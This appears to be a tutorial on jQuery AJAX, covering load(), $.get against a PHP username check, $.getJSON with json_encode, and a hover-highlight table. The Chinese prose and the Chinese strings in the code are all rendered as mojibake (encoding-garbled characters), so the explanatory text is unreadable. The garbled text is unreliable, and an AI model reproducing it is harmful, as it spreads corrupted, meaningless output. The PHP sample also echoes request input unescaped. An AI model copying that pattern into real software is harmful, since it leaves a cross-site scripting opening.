<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæˆ‘ä»¬èƒ½åŠ¨æ€åœ°å¯¹htmlé¡µé¢è¿›è¡Œæ“ä½œã€‚å†ç»“åˆajaxï¼Œå°±å¯ä»¥åŠ¨æ€åœ°å‘æœåŠ¡å™¨è¯·æ±‚å†…å®¹ï¼Œå¹¶åœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹æ›´æ–°é¡µé¢ä¸­ä¸€éƒ¨åˆ†ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯ajax</strong></p>
<p>ajaxæŒ‡å¼‚æ­¥javascriptã€‚ç›¸ä¿¡å¾ˆå¤šåŒå­¦åœ¨ç™¾åº¦ç™¾ç§‘é‡Œä¹Ÿçœ‹åˆ°äº†å®ƒçš„ç›¸å…³ä»‹ç»ï¼Œä¸è¿‡è¯´çš„æŒºå¤æ‚ï¼Œå„ç§å„æ ·çš„ä¸“ä¸šæœ¯è¯­ã€‚å¦‚æœåªæ˜¯åŸºç¡€ï¼Œæˆ‘ä»¬è¿™æ ·ç†è§£ajaxå¥½äº†ï¼šåˆ©ç”¨ajaxå¯ä»¥åŠ¨æ€åœ°ä»¥javascriptçš„æ–¹å¼å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ï¼Œå¹¶æ¥å—æœåŠ¡å™¨å‘å›çš„æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹æµè§ˆå™¨å¯ä»¥åšå…¶ä»–çš„ä»»ä½•å·¥ä½œï¼Œå¯ä»¥ä¸ç¦»å¼€é¡µé¢ï¼Œä¸åˆ·æ–°ã€‚</p>
<p>å…·ä½“æ¥è¯´å‘¢ï¼Ÿæˆ‘ä¸¾ä¸ªå°ä¾‹å­ï¼Œç°åœ¨æœ‰ä¸€ä¸ªæ³¨å†Œè¡¨å•ï¼Œè¦ç”¨æˆ·å¡«å†™ç”¨æˆ·åã€‚ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ªâ€œæ£€æŸ¥æ˜¯å¦å·²è¢«å ç”¨â€é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œæµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæ–°é¡µé¢ï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨æ•°æ®åº“é‡Œå’¨è¯¢çœ‹ç”¨æˆ·åæ˜¯å¦å·²å­˜åœ¨ï¼Œå¾—åˆ°ç»“æœåè¿”å›åˆ°é¡µé¢é‡Œæç¤ºç”¨æˆ·ã€‚å¦‚æœä¸ç”¨ajaxï¼Œå¤§å®¶å¯ä»¥æƒ³è±¡ï¼Œç‚¹å‡»äº†é“¾æ¥ï¼Œæµè§ˆå™¨åŠ¿å¿…è¦æ‰“å¼€æ–°é¡µé¢ï¼Œç»™ç”¨æˆ·å¸¦æ¥ä¸ä¾¿ã€‚ä½†æ˜¯è¿ç”¨ajaxï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œä¸æ‰“å¼€æ–°é¡µé¢ï¼Œè€Œç”±javascriptåœ¨åå°å‘æœåŠ¡å™¨è·å–ç»“æœï¼Œç„¶åç”¨ä¸€ä¸ªæç¤ºæ¡†å¼¹å‡ºæç¤ºç”¨æˆ·ï¼Œç”¨æˆ·åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¿˜å¯ä»¥ç»§ç»­å¡«å†™è¡¨å•ï¼Œä¸¤ä¸ªè¿‡ç¨‹äº’ä¸å½±å“ã€‚é¡µé¢ä¸ä¼šè·³è½¬ï¼Œä¹Ÿä¸ä¼šåˆ·æ–°ï¼Œç”¨æˆ·ä¹‹å‰å¡«å†™çš„å†…å®¹ä¸ä¼šä¸¢å¤±ã€‚</p>
<p>è¿™å°±æ˜¯æ‰€è°“çš„å¼‚æ­¥ï¼Œç±»ä¼¼äºå¤šçº¿ç¨‹ã€‚</p>
<p>ç”šè‡³æˆ‘ä»¬åšä¸€ä¸ªç½‘ç«™ï¼Œæ”¾ä¸ŠèƒŒæ™¯éŸ³ä¹ï¼Œç½‘ç«™ä¸­ä¸€åˆ‡é“¾æ¥éƒ½ç”±ajaxå®Œæˆï¼ˆæ¯”å¦‚ç‚¹å‡»äº†ä¸€ç‰‡æ–‡ç« ï¼Œajaxå‘æœåŠ¡å™¨è¯·æ±‚æ–‡ç« å†…å®¹ï¼Œç„¶åç”¨æˆ‘ä¸Šæ¬¡è¯´çš„Jquery htmlæ“ä½œå°†ç½‘é¡µä¸­çš„ä¸€éƒ¨åˆ†è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·æ–‡ç« å°±æ”¾å…¥äº†é¡µé¢è€Œå¹¶ä¸åˆ·æ–°é¡µé¢ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„éŸ³ä¹å°±ä¸€ç›´ä¸ä¼šè¢«åˆ·æ–°ã€‚</p>
<p>æ‰€ä»¥è¯´ajaxæœ€å¤§çš„ä¼˜ç‚¹ï¼Œå°±æ˜¯åœ¨ä¸æ›´æ–°æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹å¯¹éƒ¨åˆ†å†…å®¹è¿›è¡Œä¿®æ”¹ã€ç»´æŠ¤ï¼Œè¿™æ ·æœåŠ¡å™¨å‘é€çš„æ•°æ®å°‘ï¼Œå‡å°‘äº†æœåŠ¡å™¨çš„è´Ÿæ‹…ã€‚</p>
<p><strong>ç®€å•çš„ajaxè·å–ä¿¡æ¯</strong></p>
<p>æ¥çœ‹çœ‹æˆ‘ä»¬ç”¨Jqueryæ€ä¹ˆå»ç»“åˆajaxã€‚</p>
<p>é¦–å…ˆçœ‹çœ‹æ€ä¹ˆè·å–æœåŠ¡å™¨ä¸Šä¸€ä¸ªtxtæ–‡ä»¶ï¼šä½¿ç”¨load()æ–¹æ³•</p>
<p> (å› ä¸ºajaxä½¿ç”¨åŒæºç­–ç•¥ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªç½‘ç«™è¿è¡Œä»£ç å°±åªèƒ½è¯·æ±‚è¯¥æœåŠ¡å™¨ä¸Šçš„å†…å®¹ï¼Œæˆ‘è¯·æ±‚çš„æ˜¯w3schoolä¸­çš„ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå¤§å®¶æŠŠä»£ç æ”¾åœ¨<code>http://www.w3school.com.cn/tiy/t.asp?f=html_basic</code>è¿è¡Œæ‰èƒ½çœ‹åˆ°æ•ˆæœ)</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;
&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
$(&quot;#btn1&quot;).click(function(){
    $(&apos;#test&apos;).load(&apos;http://www.w3school.com.cn/example/jquery/demo_test.txt&apos;);
    })
})
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;h3 id=&quot;test&quot;&gt;è¯·ç‚¹å‡»ä¸‹é¢çš„æŒ‰é’®ï¼Œé€šè¿‡ jQuery AJAX æ”¹å˜è¿™æ®µæ–‡æœ¬ã€‚&lt;/h3&gt;
&lt;button id=&quot;btn1&quot; type=&quot;button&quot;&gt;è·å¾—å¤–éƒ¨çš„å†…å®¹&lt;/button&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œç‚¹å‡»æŒ‰é’®åæ–‡æœ¬è¢«æ”¹å˜ã€‚è¿™å…¶ä¸­æˆ‘è¯·æ±‚çš„å°±æ˜¯<code>http://www.w3school.com.cn/example/jquery/demo_test.txt</code>æ–‡ä»¶ã€‚çœ‹åˆ°Jqueryä»£ç ï¼Œå®ƒä¸ºæŒ‰é’®ç»‘å®šäº†clickäº‹ä»¶ï¼Œç‚¹å‡»æŒ‰é’®åï¼Œæ‰§è¡Œ$(â€˜#testâ€™).load(â€˜<a href="http://www.w3school.com.cn/example/jquery/demo_test.txt" target="_blank" rel="external">http://www.w3school.com.cn/example/jquery/demo_test.txt</a>â€˜); ä¹Ÿå°±æ˜¯è¯·æ±‚è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†id=testçš„å…ƒç´ å†…å®¹æ”¹å˜æˆè¯·æ±‚åˆ°çš„æ–‡æœ¬ã€‚</p>
<p>è¿™æ˜¯æœ€ç®€å•çš„ajaxï¼Œç®€å•åœ°è¯·æ±‚ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æœ€å¸¸è§çš„ï¼Œæˆ‘ä»¬æ˜¯å‘ä¸€ä¸ªè„šæœ¬ï¼Œé€šè¿‡getæˆ–postè¯·æ±‚ä¸€ä¸ªhtmlæˆ–jsonã€‚</p>
<p><strong>ajaxä½¿ç”¨getè¯·æ±‚å‘æœåŠ¡å™¨è¯·æ±‚htmlå†…å®¹</strong></p>
<p>åˆå›åˆ°æˆ‘ä»¬å¼€å§‹çš„é‚£ä¸ªä¾‹å­ï¼Œåˆ¤æ–­ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬æœåŠ¡å™¨ä¸Šæœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶nameexists.php:</p>
<pre><code>&lt;?php
$name = $_GET[&apos;act&apos;];
/*
*
*åœ¨æ•°æ®åº“ä¸­å’¨è¯¢ç”¨æˆ·åæ˜¯å¦å­˜åœ¨
*
*/
$re = true; //å‡è®¾ç”¨æˆ·åå­˜åœ¨
if($re){
    echo &quot;ç”¨æˆ·å $name å·²å­˜åœ¨&quot;;
}else{
    echo &quot;æ­å–œæ‚¨ï¼Œè¯¥ç”¨æˆ·åå¯ä»¥ä½¿ç”¨&quot;;
}
?&gt;
</code></pre><p>ç„¶åæˆ‘ä»¬æµè§ˆå™¨è¡¨å•å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function sub(){
    var name = $(&quot;#name&quot;).val();
    $.get(&quot;nameexists.php&quot;, {
        &quot;act&quot;: name
    }, function(data, status){
        if (status) {alert(data);}
    });
}
&lt;/script&gt;
&lt;form&gt;
    &lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt;
    &lt;input type=&quot;button&quot; value=&quot;éªŒè¯&quot; onclick=&quot;sub();&quot;/&gt;
&lt;/form&gt;
</code></pre><p>å¤§å®¶è¯•éªŒå³å¯çœ‹åˆ°ï¼Œå½“ç‚¹å‡»â€œéªŒè¯â€åï¼Œå¼¹å‡ºæç¤ºæ¡†</p>
<p>å¹¶æ²¡æœ‰åˆ·æ–°é¡µé¢ï¼Œæˆ‘ä»¬å¡«å†™çš„å†…å®¹ä¾æ—§åœ¨è¡¨å•ä¸­ã€‚è¿™å°±æ˜¯å‘æœåŠ¡å™¨è¯·æ±‚äº†htmlï¼Œè¿”å›çš„â€œç”¨æˆ·åâ€¦å·²å­˜åœ¨â€å°±æ˜¯ä¸€ä¸ªhtmlæ–‡æœ¬ï¼Œæœ€åä½“ç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p>
<p>æˆ‘ä»¬çœ‹Jqueryä»£ç ã€‚è¿™æ˜¯ä¸€ä¸ªjavascriptå‡½æ•°ï¼Œå½“ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚é¦–å…ˆé€‰æ‹©å™¨é€‰æ‹©äº†id=nameçš„æ–‡æœ¬æ¡†ï¼Œç”¨val()æ–¹æ³•è·å–å…¶å€¼ï¼Œå¹¶èµ‹å€¼ç»™nameå˜é‡ã€‚</p>
<p>çœ‹åé¢ï¼Œç”¨åˆ°äº†getæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå…¨å±€çš„æ–¹æ³•ï¼Œæ‰€ä»¥å†™æˆ$.getï¼Œè¿™ä¸ªæ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š$.get(url, data, callback);</p>
<p>urlæ˜¯æˆ‘ä»¬è¦è¯·æ±‚çš„åœ°å€ï¼Œdataæ˜¯æˆ‘ä»¬è¦ä¼ é€’çš„å‚æ•°ï¼Œå†™æˆ{â€˜ç´¢å¼•1â€™:â€™å‚æ•°2â€™,â€™ç´¢å¼•2â€™:â€™å‚æ•°2â€™â€¦}çš„å½¢å¼ï¼Œä¹Ÿå¯ä»¥æŠŠä»–ä»¬ç›´æ¥å†™åœ¨urlåé¢: url?a=1&amp;b=2â€¦ ï¼ˆåªé€‚ç”¨äºgetè¯·æ±‚ï¼‰ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°callbackæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è·å–åˆ°æ•°æ®åè¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ”¶åˆ°çš„æ•°æ®å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¤„ç†ã€‚å‡½æ•°åŸå‹ï¼šfunction(data,status,xhr)</p>
<p>dataæ˜¯è·å¾—çš„è¿”å›æ•°æ®ï¼Œstatusæ˜¯çŠ¶æ€ï¼ˆæˆåŠŸæˆ–å¤±è´¥ï¼‰ï¼Œxhræ˜¯XMLHttpRequestå¯¹è±¡ï¼ˆæˆ‘è¿™é‡Œç”¨ä¸ä¸Šï¼‰ã€‚</p>
<p>æ‰€ä»¥å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç›´æ¥æŠŠè·å¾—çš„è¿”å›æ•°æ®dataå¼¹å‡ºæ¥ï¼šalert(data)ã€‚è€Œæˆ‘ä»¬çœ‹åˆ°phpï¼Œå…¶å®è¿™ä¸ªdataå°±æ˜¯echoè¾“å‡ºçš„å†…å®¹ã€‚</p>
<p>ç±»ä¼¼äºgetæ–¹å¼ï¼Œpost()æ–¹æ³•å‚æ•°éƒ½ä¸getç›¸åŒï¼Œæˆ‘å°±ä¸ä¸¾ä¾‹å­äº†ã€‚è¿™æ˜¯è·å–çš„htmlå†…å®¹ï¼Œå…¶å®åœ¨javascriptä¸­ï¼Œæ›´å¤šçš„æ˜¯è·å–jsonï¼Œå†é€šè¿‡javascriptä»£ç å¤„ç†jsonæ¥æ˜¾ç¤ºç»™æˆ‘ä»¬ç”¨æˆ·çœ‹ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯json</strong></p>
<p>åˆåˆ°äº†æ™®åŠæ¦‚å¿µçš„æ—¶å€™ã€‚jsonæ˜¯ä¸€ç§javascriptåŸç”Ÿçš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚</p>
<p>åœ¨äº’è”ç½‘ä¸Šï¼Œæœ€æ™®éçš„å°±æ˜¯æ•°æ®äº¤æ¢ã€‚æ¯”å¦‚åœ¨QQä¸Šï¼ŒAå‘Bå‘é€ä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—æ¯æˆ–ä¸€å¥è¯ï¼Œæ¥å‘Šè¯‰BæŸäº›ä¿¡æ¯ã€‚ä½†æ˜¯æ•°å­—ã€å­—ç¬¦ä¸²å¾ˆå¥½ä¼ é€’ï¼Œæœ‰äº›å¯¹è±¡å´å¹¶ä¸é‚£ä¹ˆå®¹æ˜“ä¼ é€’ï¼Œæ¯”å¦‚æ•°ç»„ã€‚æˆ‘ä»¬æ€ä¹ˆæŠŠä¸€ä¸ªæ•°ç»„å¯¹è±¡é€šè¿‡QQå‘é€ç»™åˆ«äººï¼Ÿ</p>
<p>æœ‰äº›äººå°±è¯´ï¼Œè¿™å¾ˆç®€å•å•Šï¼Œåœ¨phpé‡Œï¼Œä¸å°±æ˜¯â€œarray(1=&gt;â€™aâ€™,2=&gt;â€™bâ€™,3=&gt;â€™Câ€™);â€æˆ‘å°±æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ç»™Bå‘é€è¿‡å»ï¼ŒBä¸€çœ‹å°±çŸ¥é“æ•°ç»„æ˜¯æ€ä¹ˆæ„æˆçš„äº†ã€‚å¯¹ï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ç§æ•°æ®äº¤æ¢æ ¼å¼ï¼Œä¸è¿‡è¿™ä»…ä»…æ˜¯phpé‡Œå®šä¹‰æ•°ç»„çš„è¯­æ³•ï¼Œå¦‚æœBä¸æ‡‚phpï¼Œä»–ä¹Ÿè®¸å°±çœ‹ä¸æ‡‚ä½ ç»™ä»–å‘é€æ˜¯è¿™ä¸ªæ˜¯ä»€ä¹ˆæ„æ€ã€‚</p>
<p>æ‰€ä»¥å°±è¯ç”Ÿäº†jsonå’Œxmlä¸¤ç§é€šç”¨çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚æˆ‘ä¸è¯´xmlä¹Ÿä¸æ¯”è¾ƒäºŒè€…ï¼Œåªæ¥è¯´è¯´jsonã€‚å› ä¸ºjsonæ˜¯ä»javascriptå‘å±•å‡ºæ¥çš„ï¼Œæ‰€ä»¥ååˆ†é€‚åˆjavascriptã€‚æ¯”å¦‚åˆšæ‰çš„æ•°ç»„ï¼Œç”¨jsonå†™å‡ºæ¥ï¼š</p>
<pre><code>{
    &quot;1&quot;: &quot;a&quot;,
    &quot;2&quot;: &quot;b&quot;,
    &quot;3&quot;: &quot;C&quot;
}
</code></pre><p>è¿™æ ·çš„jsonèƒ½åœ¨ä»»ä½•javascriptä¸­è¢«è§£ææˆä¸€ä¸ªjsonå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡json.xxxæ¥å¾—åˆ°ç›¸åº”å†…å®¹ã€‚</p>
<p><strong>ajaxçš„jsonæ–¹æ³•</strong></p>
<p>Jqueryä¸­ä»æœåŠ¡å™¨åŠ è½½jsonæ•°æ®çš„æ–¹æ³•æ˜¯ï¼š$.getJSON</p>
<p>å®ƒçš„å‚æ•°ä¸get()æ–¹æ³•å®Œå…¨ä¸€æ ·ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿”å›ç»“æœdataåº”è¯¥æ˜¯ä¸€ä¸ªjsonæ ¼å¼çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æœä¸æ˜¯å°±å‡ºé”™ï¼‰ã€‚</p>
<p>æˆ‘è¯´äº†jsonæ˜¯ä¸€ä¸ªé€šç”¨çš„æ•°æ®äº¤æ¢ç¼–ç ï¼Œæ‰€ä»¥åœ¨phpé‡Œä¹Ÿæœ‰æ–¹æ³•æŠŠå¯¹è±¡å¤„ç†æˆjsonå­—ç¬¦ä¸²ã€‚åœ¨php5.2ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œæœ‰äº†ä¸€å¯¹å‡½æ•°json_encode()å’Œjson_decode()ï¼Œåˆ†åˆ«å¯¹phpä¸­å¯¹è±¡è¿›è¡Œjsonæ ¼å¼çš„ç¼–ç å’Œè§£ç ã€‚</p>
<p>ä¸¾ä¸ªæ²¡ä»€ä¹ˆè¥å…»çš„ä¾‹å­ã€‚</p>
<p>æœåŠ¡ç«¯ï¼š</p>
<pre><code>&lt;?php
$arr = array(&apos;name&apos;=&gt;&apos;name&apos;, &apos;url&apos;=&gt;&quot;url&quot;, &apos;PR&apos;=&gt;0);
echo json_encode($arr);
?&gt;
</code></pre><p>æµè§ˆå™¨ï¼š</p>
<pre><code>&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function sub(){
    $.getJSON(&quot;test2.php&quot;, function(data, status){
        if (status){
            $(&quot;div&quot;).html(data.name + &apos; | &apos; + data.url + &apos; | &apos; + data.PR);
        }
    });
}
&lt;/script&gt;
&lt;form&gt;
    &lt;div&gt;&lt;/div&gt;
    &lt;input type=&quot;button&quot; value=&quot;æäº¤&quot; onclick=&quot;sub();&quot;/&gt;
&lt;/form&gt;
</code></pre><p>å¤§å®¶å¯ä»¥è¯•éªŒï¼Œç‚¹å‡»äº†æŒ‰é’®åï¼Œæ‰“å°å‡ºäº†phpä¸­å®šä¹‰çš„æ•°ç»„å†…å®¹ã€‚phpç«¯ä¸¤è¡Œä»£ç ï¼Œå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ç”¨json_encodeæŠŠæ•°ç»„åšæˆä¸€ä¸ªjsonç¼–ç çš„å­—ç¬¦ä¸²è¾“å‡ºã€‚</p>
<p>å†çœ‹Jqueryä»£ç ï¼Œå¤§å®¶ä¼šå‘ç°ï¼Œå®é™…ä¸Šè·å¾—çš„å†…å®¹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬ç”¨ç‚¹å·è®¿é—®å¯¹è±¡ä¸­å†…å®¹ï¼šdata.name, data.url, data.PR.</p>
<p>è¿™åªæ˜¯jsonçš„ç®€å•äº‹ä¾‹ï¼Œæ²¡ä»€ä¹ˆå®ç”¨æ€§ã€‚å¤§å®¶å¯ä»¥è¯•æƒ³ï¼Œå‡å¦‚å›¾ä¹¦é¦†æœ‰ä¸ªå›¾ä¹¦æ£€ç´¢ç³»ç»Ÿï¼Œç”¨æˆ·å‘æœåŠ¡å™¨è¯·æ±‚ä¹¦åï¼ŒæœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“åæŠŠæ‰€æœ‰ç¬¦åˆæ¡ä»¶å›¾ä¹¦ä¿¡æ¯åšæˆä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå†ç”¨jsonå½¢å¼å‘é€ç»™æµè§ˆå™¨ï¼ŒJqueryæŠŠä»–ä»¬ç¾åŒ–åè¾“å‡ºï¼Œè¿‡ç¨‹å¹¶ä¸å¤æ‚ã€‚</p>
<p><strong>ä¸€ä¸ªé¼ æ ‡ç§»åŠ¨ä¸Šå»å°±å˜æ¢é¢œè‰²çš„è¡¨æ ¼</strong></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;è¡¨æ ¼1&lt;/title&gt;
&lt;style&gt;
table.hovertable {
    font-size:13px;
    color:#333333;
    border-width: 1px;
    border-color: #999999;
    border-collapse: collapse;
    width: 100%;
}
table.hovertable th {
    background-color:#c3dde0;
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
    text-align: left;
}
table.hovertable tr {
    background-color:#d4e3e5;
}
table.hovertable td {
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
}
&lt;/style&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
    $(&quot;.hovertable td&quot;).mouseover(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;
    });
    $(&quot;.hovertable td&quot;).mouseout(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;;
    });
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;table class=&quot;hovertable&quot;&gt;
&lt;tr&gt;&lt;th&gt;æ ‡é¢˜&lt;/th&gt;&lt;th&gt;å†…å®¹&lt;/th&gt;&lt;th&gt;æ—¶é—´&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;aaa&lt;/td&gt;&lt;td&gt;15:30&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;bbb&lt;/td&gt;&lt;td&gt;17:40&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;ccc&lt;/td&gt;&lt;td&gt;13:35&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;ddd&lt;/td&gt;&lt;td&gt;08:53&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>å¤§å®¶ä¾æ—§æ˜¯æ”¾åˆ°<code>http://www.w3school.com.cn/tiy/t.asp?f=jquery_hide</code> è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“é¼ æ ‡ç§»åŠ¨åˆ°ç›¸åº”çš„è¡Œä¸Šçš„æ—¶å€™ï¼Œè¯¥è¡Œå˜è‰²ï¼Œå½“é¼ æ ‡ç§»èµ°æ—¶ï¼Œé¢œè‰²æ¢å¤ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery4.png" alt=""></p>
<p>è¿™ä¸ªæ•ˆæœç›¸ä¿¡å¤§å®¶åœ¨å¾ˆå¤šåœ°æ–¹è§åˆ°è¿‡ï¼Œæˆ‘è¿™é‡Œè¿ç”¨äº†Jqueryå’ŒHTML DOMä¸¤ç§æ–¹æ³•ç»“åˆã€‚è¿™å°±æ˜¯æˆ‘è¦è¯´çš„ä¸€ä¸ªé‡ç‚¹ã€‚</p>
<p>æˆ‘ä»¬çœ‹Jqueryä»£ç ï¼š<code>$(&quot;.hovertable td&quot;).mouseover</code>ï¼Œé€‰æ‹©äº†class=hovertableçš„å…ƒç´ çš„tdå­å…ƒç´ ï¼Œä¸ºä»–çš„mouseoveräº‹ä»¶ç»‘å®šä¸€ä¸ªå‡½æ•°ã€‚tdå…ƒç´ å°±æ˜¯è¡¨æ ¼ä¸­çš„ä¸€ä¸ªæ ¼å­ï¼Œmouseoveräº‹ä»¶æŒ‡â€œé¼ æ ‡ç§»åŠ¨åˆ°ä¸Šé¢â€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç”¨æˆ·é¼ æ ‡ç§»åŠ¨åˆ°æ¯ä¸ªæ ¼å­ä¸Šï¼Œéƒ½ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œè¿›è€Œæ‰§è¡Œå‡½æ•°ä¸­çš„ä»£ç ã€‚</p>
<p>çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¸­çš„ä»£ç ï¼Œ<code>event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;</code></p>
<p>eventæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œfunction(event)ï¼Œæ‰€ä»¥eventæ˜¯è¿™ä¸ªäº‹ä»¶ç»‘å®šå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼Œå®ƒæŒ‡çš„å°±æ˜¯â€œé¼ æ ‡æ è¿‡â€äº‹ä»¶å¯¹è±¡ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªeventï¼Ÿå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡ç§»åŠ¨åˆ°æŸä¸€è¡Œä¸Šï¼Œåªæœ‰è¿™ä¸€è¡Œçš„é¢œè‰²ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“é¼ æ ‡ç§»åŠ¨åˆ°å“ªä¸€è¡Œä¸Šäº†ï¼Œæ‰€ä»¥å¿…é¡»è·å¾—è¿™ä¸ªeventå¯¹è±¡ã€‚</p>
<p>eventå¯¹è±¡æœ‰å¦‚ä¸‹ä¸€äº›æ–¹æ³•æˆ–å±æ€§ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery6.png" alt=""></p>
<p>å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç”¨åˆ°çš„å°±æ˜¯targetå±æ€§ï¼Œevent.targetæŒ‡çš„å°±æ˜¯è§¦å‘mouseoveräº‹ä»¶çš„DOMå…ƒç´ ï¼Œåœ¨è¿™é‡Œå°±æ˜¯tdã€‚</p>
<p>æ‰€ä»¥åœ¨å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°äº†é¼ æ ‡æ‰€åœ¨çš„å…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘æ¥è¯´ä¸€ä¸‹æˆ‘ä»¬è·å¾—çš„è¿™ä¸ªDOMå¯¹è±¡ã€‚</p>
<p>åœ¨Jqueryä¸­ï¼Œæœ‰å¯¹htmlæ“ä½œçš„ä¸€äº›å‡½æ•°ï¼Œæ¯”å¦‚<code>$(xx).html()</code>ï¼Œè·å–æŸå…ƒç´ å†…çš„å†…å®¹ã€‚è€Œåœ¨å•çº¯çš„javascriptä¸­ï¼Œä¹Ÿæœ‰å¯¹htmlæ“ä½œçš„DOMå‡½æ•°ï¼Œæ¯”å¦‚xx.innerHTMLï¼Œå®ƒä¹Ÿæ˜¯è·å–æŸå…ƒç´ ä¸­çš„å†…å®¹ã€‚è€Œåœ¨å®é™…è¿ç”¨ä¸­ï¼Œè¿™ä¸¤ç§å‡½æ•°æ˜¯ä¸èƒ½äº’ç›¸ä½¿ç”¨çš„ã€‚æ¯”å¦‚æˆ‘ä»¬ä¸€ä¸ªJqueryå¯¹è±¡ï¼š$(â€œdiv#testâ€)ï¼Œå®ƒä¸èƒ½ç”¨<code>$(&quot;div#test&quot;).innerHTML</code>æ¥è·å–å†…å®¹ï¼Œåªèƒ½ç”¨<code>$(&quot;div#test&quot;).html()</code>æ¥è·å–ã€‚</p>
